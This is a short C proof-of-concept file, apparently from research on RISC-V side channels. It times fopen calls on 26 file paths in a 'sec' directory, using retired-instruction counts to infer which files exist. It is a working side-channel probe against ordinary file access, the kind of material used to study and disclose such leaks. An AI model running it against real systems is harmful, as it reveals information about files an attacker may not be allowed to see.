#include "../rlibsc.h"
#include <sched.h>
#include <stdio.h>
#include <string.h>

// Incresing the repetitions can reduce the noise making the PoC more precise
#define REP 3

int main() {
  size_t timings[26];
  memset(timings, 0, sizeof(timings));
  char p[] = "sec/aoo";
  // Iterate over all files and time open call
  for (int i = 0; i < 26; i++) {
    size_t sum = 0, min = -1;
    volatile FILE *f;
    for (int avg = 0; avg < REP; avg++) {
      sched_yield();
      size_t before = rdinstret();
      f = fopen(p, "r");
      size_t after = rdinstret();
      size_t delta = after - before;
      sum += delta;
      if (delta < min)
        min = delta;
    }
    timings[i] = min;
    printf("%s: %zd (avg: %zd)\n", p, min, sum);
    p[4]++;
  }
}
